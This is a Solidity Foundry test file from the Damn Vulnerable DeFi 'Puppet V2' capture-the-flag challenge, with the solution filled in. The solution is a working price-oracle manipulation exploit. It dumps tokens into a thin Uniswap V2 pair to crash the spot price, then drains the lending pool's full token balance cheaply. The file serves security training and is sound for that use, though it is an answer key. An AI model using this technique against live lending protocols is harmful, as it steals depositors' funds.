// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {console2} from "forge-std/Console2.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
import {UniswapV2Library} from "../../src/puppet-v2/UniswapV2Library.sol";

contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;

    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;

    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(
                string.concat(
                    vm.projectRoot(),
                    "/builds/uniswap/UniswapV2Factory.json"
                ),
                abi.encode(address(0))
            )
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(
                    vm.projectRoot(),
                    "/builds/uniswap/UniswapV2Router02.json"
                ),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,
            deadline: block.timestamp * 2
        });
        uniswapV2Exchange = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(token), address(weth))
        );

        // Deploy the lending pool
        lendingPool = new PuppetV2Pool(
            address(weth),
            address(token),
            address(uniswapV2Exchange),
            address(uniswapV2Factory)
        );

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(
            token.balanceOf(address(lendingPool)),
            POOL_INITIAL_TOKEN_BALANCE
        );
        assertGt(uniswapV2Exchange.balanceOf(deployer), 0);

        // Check pool's been correctly setup
        assertEq(
            lendingPool.calculateDepositOfWETHRequired(1 ether),
            0.3 ether
        );
        assertEq(
            lendingPool.calculateDepositOfWETHRequired(
                POOL_INITIAL_TOKEN_BALANCE
            ),
            300000 ether
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV2() public checkSolvedByPlayer {
        // 1. swap all $DVT tokens for $WETH to manipulate prices
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        uint256[] memory out = uniswapV2Router.getAmountsOut(
            PLAYER_INITIAL_TOKEN_BALANCE,
            path
        );

        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);

        uniswapV2Router.swapExactTokensForTokens(
            PLAYER_INITIAL_TOKEN_BALANCE,
            out[1],
            path,
            player,
            block.timestamp * 2
        );

        // 2. calculate how much the lending pool needs in $WETH to borrow us the entire $DVT balance
        uint256 expectedWETH = lendingPool.calculateDepositOfWETHRequired(
            POOL_INITIAL_TOKEN_BALANCE
        );
        // @dev assumes `expectedWETH` is greater than player's WETH balance
        uint256 outstandingWETHAmount = expectedWETH - weth.balanceOf(player);

        // 3. approve $WETH needed to drain pool of $DVT
        weth.deposit{value: outstandingWETHAmount}();
        weth.approve(address(lendingPool), expectedWETH);
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

        // 4. send all funds to `recovery`
        token.transfer(recovery, token.balanceOf(player));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(
            token.balanceOf(address(lendingPool)),
            0,
            "Lending pool still has tokens"
        );
        assertEq(
            token.balanceOf(recovery),
            POOL_INITIAL_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}
